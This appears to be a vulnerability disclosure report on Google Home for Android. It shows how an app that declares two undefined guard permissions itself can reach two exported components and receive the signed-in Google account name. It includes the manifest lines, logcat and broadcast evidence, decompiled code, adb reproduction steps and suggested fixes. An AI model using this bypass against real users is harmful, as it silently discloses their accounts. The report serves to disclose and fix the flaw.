**Title:**
Google Home: two exported components are guarded by permissions that nothing on the
device defines, and reaching one of them hands any app the signed-in Google account

---

Testing date: 2026-10-21
Testing time: 13:18 to 18:17 UTC. The three evidence sections below are all from one run
at 17:25 UTC; the two cold-start lines are from 18:11 and 18:16 UTC and are labelled where
they appear.
Researcher IP: 180.148.212.54
Device: moto g stylus 5G (2024), Android 15 (API 35), stock, not rooted
App: com.google.android.apps.chromecast.app (Google Home), versionName=4.33.27.4
Tools: adb, jadx, aapt2, apksigner — plain AOSP build chain, nothing exotic
Attached PoC APK — mvrp-poc.apk, package com.cindrasec.mvrpprobe.
  Declares the two permission names below and nothing else. No real Android
  permission of any kind, so anything it can do, any app can do.
  sha256 7e7ef501d9be335a1e01acf9996a3c59e7538bdc60bc14870a1667ba58fabf9d
Attached control APK — mvrp-control.apk, package com.cindrasec.mvrpctl.
  Built from the same source with the same key; its manifest declares no
  permissions at all. It is what the "SKIPPED" line below comes from.
  sha256 d59cfc29ab66c850eb3bc7a94685739cd77a4b8700875aa82db99c9756b34346
Attached source — lockproximity-poc-src.zip, the full source both APKs are built
  from: one source tree and two manifests.
  sha256 b18ba6420c26b203f499f2653c9b5b8545a2f7ae394527f0f482d69fe675328c

Both APKs attached here are the exact files installed on the test device when
the output below was captured.

---

## Summary

Google Home exports two components whose `android:permission` guards name permissions that
no package on this device defines. One of the two names cannot be defined anywhere: it is
two permission names joined with a `|`, and `android:permission` takes one name.

An app can declare those names itself at `protectionLevel="normal"` and is granted them at
install with no prompt, which makes it the only party on the device that passes either
guard. Doing so gets it the signed-in Google account out of Google Home, in 65 ms, with no
user interaction at the time, and it holds no real Android permission to do it. The one
precondition — that Google Home has been opened since its process was last killed — is
measured below rather than assumed.

Attached are two APKs built from one source tree that differ only in two `<permission>`
rows, and the system's own records of what it did about each.

## The bug

Google Home's manifest declares:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver"
    android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"/>
    </intent-filter>
</receiver>
```

`android:permission` takes one permission name. There are two here, joined with `|`.
Android does not split on `|`; it treats the whole string as a single permission name,
and no package on the device defines a permission called
`android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN`.

Because no package defines that name, a third-party app can declare it itself at
`protectionLevel="normal"`, request it, and be granted it at install with no user prompt.
It then passes the check that every other unprivileged app fails.

I am deliberately not claiming anything about whether the receiver's intended deliveries
still work. Every `BLE_SCANNED` record in this device's broadcast history carries a
timestamp from my own test runs, and the account has no smart lock, so no legitimate
delivery was expected or observed. Reading the code, the app registers its scan callback
as a `PendingIntent`, which is dispatched under the app's own identity and so would not be
affected — but I did not test that, and I am not asserting it.

What I am asserting is only what the records show: the guard refuses ordinary apps, and an
app that declares the name itself is not refused.

## What I demonstrated

An app holding no real permissions can declare that name itself, be granted it at
install, and have its broadcast delivered to the receiver. An otherwise identical app
that does not declare it is refused by the system.

I built two APKs from the same source. The only difference is these two lines in one of
them:

```xml
<permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
            android:protectionLevel="normal" />
<uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />
```

The attached PoC declares nothing else — no real Android permission of any kind — so
everything below is what an app with no capabilities at all can do. Both names are granted
at install, with no prompt and no entry anywhere in the UI, because neither is a real
permission:

```
$ adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
    install permissions:
      android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN: granted=true
      com.google.android.settings.setup.dock.RUN_DOCK_SETUP: granted=true
```

Both apps then send the same broadcast: action
`com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED`,
component set to the receiver, extras `hgs_device_id`, `device_name`, `request_id` and a
one-element `ArrayList<ScanResult>` under `android.bluetooth.le.extra.LIST_SCAN_RESULT`.

The clearest evidence is Android's own broadcast history, which records the outcome and
the reason independently of anything either app logs. Both records below come from one
`adb shell dumpsys activity broadcasts` taken right after running each app once, in the
run that produced the attached screenshot. The dump is several thousand lines; I have
kept the caller, clock, outcome and reason lines verbatim and dropped the rest.

Timestamps in these records are the device's local clock, UTC+06:00 — 23:25 local is
17:25 UTC. (The unset `dispatchClockTime` printing as `1970-01-01 06:00:00.000` rather
than `00:00:00` is the same offset showing through.)

**Control app, declares no permissions at all — refused at enqueue:**

```
BroadcastRecord{147f73b com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
caller=com.cindrasec.mvrpctl 0:com.cindrasec.mvrpctl/u0a569 pid=22778 uid=10569
enqueueClockTime=2026-10-21 23:25:51.796 dispatchClockTime=1970-01-01 06:00:00.000
SKIPPED terminal +6h24m48s904ms (-1) #0: (manifest)
reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) } from com.cindrasec.mvrpctl (pid=22778, uid=10569) to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
```

The `+6h24m` on that SKIPPED line is not a real duration — `dispatchClockTime` is still at
the epoch because the broadcast was never dispatched, so the figure is measured from a
time that was never set.

**PoC app, three seconds later, declares the two names and nothing else — delivered:**

```
BroadcastRecord{17259ca com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
caller=com.cindrasec.mvrpprobe 0:com.cindrasec.mvrpprobe/u0a568 pid=22855 uid=10568
enqueueClockTime=2026-10-21 23:25:54.943 dispatchClockTime=2026-10-21 23:25:54.944
DELIVERED scheduled +1ms terminal +17ms (-1) #0: (manifest)
reason: remote app
```

The system states the rule and the reason itself: the receiver requires that permission
name, the app that declared it passes, the app that did not is skipped at enqueue. The
declaration is the only difference between the two APKs — same source, same signing key,
same broadcast, three seconds apart on the same device.

Google Home's own process also logs a `BluetoothAdapter` line immediately after each
delivered broadcast — the Bluetooth check at the top of `onReceive` — and nothing after
the skipped ones. I repeated that comparison 15 times across three sessions, including a
third branch where nothing was sent at all, and the result was 15/15 for the app with the
declaration and 0/15 for both the control app and the silent branch. Those 15 rounds were
run with an earlier build of this same code, before I trimmed it down to the attached
PoC; the broadcast it sends is identical.

## A second component in the same app, same technique

`LockProximityReceiver` is not the only one. The same sweep found
`com.google.android.apps.chromecast.app.titan.dock.activity.FirstDockActivity`,
exported and guarded by `com.google.android.settings.setup.dock.RUN_DOCK_SETUP`.
No package installed on this phone defines that permission, so nothing on it can hold
that guard. I have not identified which package is meant to define it. That matters for
the account disclosure below, which rests on this permission being undefined: it will
reproduce on any device without the defining package, and not on one that has it. The
first component does not depend on that — `android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN`
cannot be defined on any device, by anyone.

The PoC declares that name too, so the same pair of APKs covers both components. Starting
the activity from each, `MVRP` is the PoC's own tag and `ActivityTaskManager` is the
framework's (logcat, same run as above, three seconds apart):

```
10-21 23:26:00.694 22914 22914 I MVRP    : STARTACT from com.cindrasec.mvrpctl -> com.google.android.apps.chromecast.app/com.google.android.apps.chromecast.app.titan.dock.activity.FirstDockActivity
10-21 23:26:00.695  2717  2812 W ActivityTaskManager: Permission Denial: starting Intent { flg=0x10000000 cmp=com.google.android.apps.chromecast.app/.titan.dock.activity.FirstDockActivity } from ProcessRecord{777fe75 22914:com.cindrasec.mvrpctl/u0a569} (pid=22914, uid=10569) requires com.google.android.settings.setup.dock.RUN_DOCK_SETUP
10-21 23:26:03.898 22962 22962 I MVRP    : STARTACT from com.cindrasec.mvrpprobe -> com.google.android.apps.chromecast.app/com.google.android.apps.chromecast.app.titan.dock.activity.FirstDockActivity
10-21 23:26:03.914 22962 22962 I MVRP    : startActivity() returned, no exception
```

The control's attempt is refused a millisecond later and the PoC's is not. Worth noting
that the control app itself logs nothing after its `STARTACT` line: the denial is recorded
by the framework, and no exception reached the caller. I did not chase down why, because
the `ActivityTaskManager` line is written by the system either way and that is what the
comparison rests on.

Two components, two different permissions, one app, the same bypass — which is why I think
the useful fix is an audit rather than a one-line change.

## What reaching FirstDockActivity is worth: the caller is handed the account

Reaching the activity is not the end of it. `FirstDockActivity` is part of a Setup Wizard
handoff, and it takes the next step's `IntentSender` from whoever started it. Class and
field names below are the obfuscated ones from the shipped APK:

```java
IntentSender intentSender =
    (IntentSender) aqhg.dc(getIntent(), "android.intent.extra.INTENT", IntentSender.class);
aqaj b = akruVar.b();                       // the signed-in account
Intent intent = new Intent();
intent.putExtra("accountName", b != null ? b.a : null);
...
Intent intent4 = new Intent("com.android.wizard.NEXT");
intent4.putExtra("wizardBundle", intent3.getBundleExtra("wizardBundle"));
...
if (intent.getExtras() != null) {
    intent4.putExtras(intent.getExtras());  // accountName goes in here
}
startIntentSenderForResult(intentSender, 0, intent4, 0, 0, 0, null);
```

That is a reasonable contract with the caller it is written for. The activity's own
intent-filter says who that is:

```xml
<activity
    android:name="com.google.android.apps.chromecast.app.titan.dock.activity.FirstDockActivity"
    android:permission="com.google.android.settings.setup.dock.RUN_DOCK_SETUP"
    android:exported="true">
    <intent-filter>
        <action android:name="com.android.settings.action.FIRST_DOCK_GHA"/>
    </intent-filter>
```

A `com.android.settings` action and a `com.google.android.settings.setup.dock` permission:
the intended caller is a system component, and `RUN_DOCK_SETUP` is what is meant to hold
it to that. Since nothing on this device defines that permission, any app holds it, and
the contract is with any app.

So the PoC hands over an `IntentSender` of its own and logs what comes back. It arrives in
a receiver that is `android:exported="false"`, so a delivery can only have come through
that app's own `PendingIntent`:

```
10-21 23:26:09.311 23022 23022 I MVRP    : DOCK from com.cindrasec.mvrpctl -> com.google.android.apps.chromecast.app/...titan.dock.activity.FirstDockActivity  (handing over our own IntentSender)
10-21 23:26:09.312  2717  3311 W ActivityTaskManager: Permission Denial: starting Intent { flg=0x10000000 cmp=com.google.android.apps.chromecast.app/.titan.dock.activity.FirstDockActivity (has extras) } from ProcessRecord{1c0d2fb 23022:com.cindrasec.mvrpctl/u0a569} (pid=23022, uid=10569) requires com.google.android.settings.setup.dock.RUN_DOCK_SETUP
10-21 23:26:12.467 23067 23067 I MVRP    : DOCK from com.cindrasec.mvrpprobe -> com.google.android.apps.chromecast.app/...titan.dock.activity.FirstDockActivity  (handing over our own IntentSender)
10-21 23:26:12.532 23067 23067 I MVRP    : SINK in com.cindrasec.mvrpprobe got a delivery, action=com.android.wizard.NEXT
10-21 23:26:12.533 23067 23067 I MVRP    :   isSetupFlow = Boolean(true)
10-21 23:26:12.533 23067 23067 I MVRP    :   firstRun = Boolean(true)
10-21 23:26:12.533 23067 23067 I MVRP    :   theme = "g…t" (String, len=13)
10-21 23:26:12.533 23067 23067 I MVRP    :   accountName = "a…m" (String, len=22)
10-21 23:26:12.533 23067 23067 I MVRP    :   suw_lifecycle = Integer(0)
```

Twelve extras arrive in all; the ones above are the ones that say anything. 65
milliseconds from `startActivity()` to the delivery. No tap, no prompt, no dialog, and
nothing on screen that would tell the user anything happened.

The control, three seconds earlier in the same capture, is refused at `startActivity` and
its `SinkReceiver` receives nothing at all.

The PoC masks the value on purpose — showing that the key arrives with a real value
attached does not need the address printed into a report. Its first character, last
character and length match the Google account signed into the Home app on this device,
and running the attached PoC on any account prints the same line unmasked in your own
logcat if you want to see it.

The two APKs differ in two `<permission>` rows. That is what decides which of them gets
handed the account.

### One condition, which I went looking for

The account comes back only if Google Home's process already has its account state
loaded. I tested this rather than assuming it, because "no preconditions" is the kind of
claim that should be measured.

Straight after `am force-stop com.google.android.apps.chromecast.app`, the delivery still
arrives and the extras still arrive — but the account is empty:

```
10-22 00:11:13.308   387   387 I MVRP: DOCK from com.cindrasec.mvrpprobe -> ...FirstDockActivity  (handing over our own IntentSender)
10-22 00:11:13.698   387   387 I MVRP: SINK in com.cindrasec.mvrpprobe got a delivery, action=com.android.wizard.NEXT
10-22 00:11:13.699   387   387 I MVRP:   accountName = null
```

Retrying immediately does not help, and the reason is in `onCreate`: it returns early on a
recreate ("Not starting FirstDockFluxActivity on recreate"), so the inner flow does not
run again and `C()` is not called. Three attempts in twelve seconds produced one delivery,
still null.

Launching Google Home once and pressing the home button is enough. The next attempt
returns the account:

```
10-22 00:16:23.319  2195  2195 I MVRP: SINK in com.cindrasec.mvrpprobe got a delivery, action=com.android.wizard.NEXT
10-22 00:16:23.320  2195  2195 I MVRP:   accountName = "a…m" (String, len=22)
```

So the condition is that the user has opened Google Home at some point since the phone
last killed its process — which is true of anyone who has the app for the reason people
have it. Nothing is required of them in Google Home at the moment the attack runs, and
nothing tells them it did.

Being exact about the other side of it: the PoC fires from its own launcher activity, and
every measurement above starts with `am start` on that activity, which is the adb
equivalent of the user tapping its icon. So the sequence is the one the Mobile VRP
scenario describes — the user installs the app and opens it — and not a silent background
run. Whether this works from the background I did not test; Android restricts background
activity launches and I would expect it to be blocked, so I am not claiming it.

(Timestamps in this subsection are 10-22 on the device's local clock, UTC+06:00, which is
18:11 and 18:16 UTC on 10-21.)

On scope: I checked every Google app I decompiled on this device for the same shape — a
class that takes an `IntentSender` out of `android.intent.extra.INTENT` and fires it with
`startIntentSenderForResult`. `FirstDockActivity` is the only one. So this is one
component, not a pattern of handoffs, and I am not suggesting otherwise. The pattern I do
think is worth auditing is the orphaned guard itself, which the sweep found 16 times.

The two guards differ in reach. The malformed string is not a permission name at all, so
it can never be held, on any device or any OS version. `RUN_DOCK_SETUP` is an ordinary
name whose defining package is simply not on this phone.

For scope: across the 132 app manifests I decoded on this device there are 159 distinct
`android:permission` values, and exactly one contains a `|`. I am not claiming the typo is
widespread. The orphaned-guard pattern is the broader one: the same sweep found 16 guard
permissions that no installed package defines, two of them in this app.

## Why this is not just forward-compatibility noise

While testing I found a separate class of orphaned guard on this device that is *not*
worth your time, and I want to separate it out so this report is not read as that.

Several Google apps ship components guarded by API 36 permissions —
`android.permission.BIND_APP_FUNCTION_SERVICE` in Find My Device, Digital Wellbeing,
Pixel Buds and GMS, and `android.permission.BIND_ALTERNATIVE_MESSAGE_TRANSPORT_SERVICE`
in Google Messages. On this API 35 device those permission names are undefined, so they
can be claimed exactly as described above and the bind request is accepted. But the
services never start, because their base classes are also API 36 and absent:

```
package android.service.messaging;
public class AlternativeMessageTransportService extends Service {
    static { throw new NoClassDefFoundError(); }     // not present on API 35
}

public abstract class pj extends AppFunctionService   // android.app.appfunctions, same
```

So those are harmless today and resolve themselves when the device reaches Android 16.
I am not reporting them.

The two components in this report are different in kind. `LockProximityReceiver` and
`FirstDockActivity` are ordinary classes that load and run on this OS right now — I have
the receiver executing in Android's own record. Their guards are orphaned for reasons that
do not resolve with an OS update:

- `android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN` is a typo. It is not a
  permission name on any version of Android and never will be.
- `com.google.android.settings.setup.dock.RUN_DOCK_SETUP` is missing an app, not an API
  level, and an OS upgrade does not install a missing app.

## Where this entry point leads

The following is read from the decompiled app. It is not something I performed.

`onReceive` takes `hgs_device_id`, `device_name`, `request_id` and the scan-result list
straight out of the intent with no caller check of any kind, and when the list is
non-empty it enqueues work named `tln_send_unlock_notification_worker`.
`LockProximityNotificationWorker` resolves the device id against the signed-in account
and, for a device with a lock trait, posts a notification on channel
`tln_unlock_notification_channel_id` whose tap target is `LockProximityUnlockActivity`,
carrying `hgs_device_id`, `request_id` and `manufacturer_data` through from the
broadcast. That activity enqueues `LockProximityUnlockWorker`, whose body is the unlock
call.

I did not reach that path, and I cannot tell you exactly where it stopped. The log line
that would say how far `onReceive` got is written at a level the release build suppresses,
so its absence tells me nothing. What I do know is that I have no smart lock on the test
account, so I could not supply a device id that resolves server side, and the notification
never appeared. `LockProximityUnlockActivity` is `android:exported="false"`, so the
unlock cannot be invoked directly and would still require the user to tap the
notification.

What I am reporting is the guard, not the unlock: a component you intended to restrict is
reachable by any app, and it sits on the path to a physical lock.

For what it is worth, the feature this receiver belongs to is public enough to have been
written up from a teardown of an earlier build, so the path above is not my reading of
dead code: https://jetstream.blog/en/google-home-smart-lock-ble-auto-unlock-app-teardown/
I found nothing published about the permission guard itself, which is why I am sending
this.

## Impact

An app the user installs, holding no real Android permission of any kind, obtains the
Google account signed into Google Home. No prompt, no interaction while it runs, nothing
visible on screen. It needs Google Home to have been opened since its process was last
killed, which I measured and which holds for anyone who uses the app. That is the concrete
gain, and it is the part I demonstrated end to end.

It also reaches `LockProximityReceiver`, which means it can make a first-party app run
its unlock-notification path on data the caller supplies. I did not get a notification
out of that path, for the reasons above, so I am not claiming that part as impact — it is
why I think the guard matters beyond the account disclosure.

Nothing in the app's permission list would look unusual to anyone reviewing it, since the
declared names are not real permissions and so appear nowhere in the permission UI. An app
doing this needs no `uses-permission` entry that a user or a reviewer would notice.

## Reproduction

```
adb install -r mvrp-poc.apk        # declares and requests the malformed name
adb install -r mvrp-control.apk    # identical source, declares nothing

adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'

# run each app once; each sends the broadcast described above
# (the control keeps the original class name, only its package differs)
adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action broadcast
adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action broadcast

# then read the system's own record of both
adb shell dumpsys activity broadcasts \
  | grep -E 'BroadcastRecord\{.*BLE_SCANNED|caller=com.cindrasec|enqueueClockTime|DELIVERED|SKIPPED|requires '

# the account disclosure: each app hands FirstDockActivity an IntentSender of its own
adb logcat -c
adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action dock
adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action dock
adb logcat -d MVRP:I ActivityTaskManager:W '*:S'
```

One record reads DELIVERED, the other SKIPPED with a Permission Denial naming the
malformed string. No logcat filtering, no timing, and nothing that depends on how the app
chooses to log. The broadcast history keeps older entries too, so take the two records
with the newest `enqueueClockTime`.

In the logcat output, only the PoC's `SinkReceiver` gets a `com.android.wizard.NEXT`
delivery, and it carries `accountName`. The control is refused before it gets there.

Both APKs and the full source are attached. It is one source tree and two manifests; the
`activity` action in the same app starts the second component described above.

## Suggested fix

Three separate things, because the two components fail for different reasons.

**The receiver.** Replace the malformed attribute value with one real permission name, or
drop `android:permission` and check the caller inside `onReceive`. `android:permission`
cannot express "either of these two", so if that was the intent it has to live in code.
Worth grepping the codebase for `android:permission` values containing a `|` while you are
there: this kind of typo fails closed, so it looks like it is working — the feature quietly
stops receiving and the guard quietly stops guarding, and neither shows up in testing.

**The activity.** The permission name here is fine; the problem is that the guard is the
only thing standing between an arbitrary caller and an account handed to a caller-supplied
`IntentSender`. A manifest permission cannot carry that on its own, because it holds only
as long as the defining package is installed — which is the failure in this report. The
durable fix is to verify the caller in code before putting anything in that intent, and
this app already contains the pattern: `CameraPreviewProvider` checks
`getCallingPackage()` in both `openFile` and `query`, allows only SystemUI, the Wear
companion and itself, and verifies the signature rather than trusting the name. AGSA does
the same thing for the very permission in this report's own orphan sweep — its
`ExportedSmartspaceTrampolineActivity` re-checks at runtime that the package declaring
`QSB` is installed, is a system app and passes a signature check, and calls `finish()`
when it is not. That check is why that component was not worth reporting. The same check
in `FirstDockActivity.C()` would close this.

**The class as a whole.** The sweep behind this report found 16 guard permissions that no
installed package defines. Most are harmless — forward-compatibility names that resolve on
a newer OS, or components whose code cannot load. The two here are not, and the difference
is not visible from the manifest. A build-time check that every `android:permission` value
either exists in the platform or is defined by a package in the same APK would have caught
the typo outright, and would have flagged `RUN_DOCK_SETUP` as depending on a package that
may not be present.
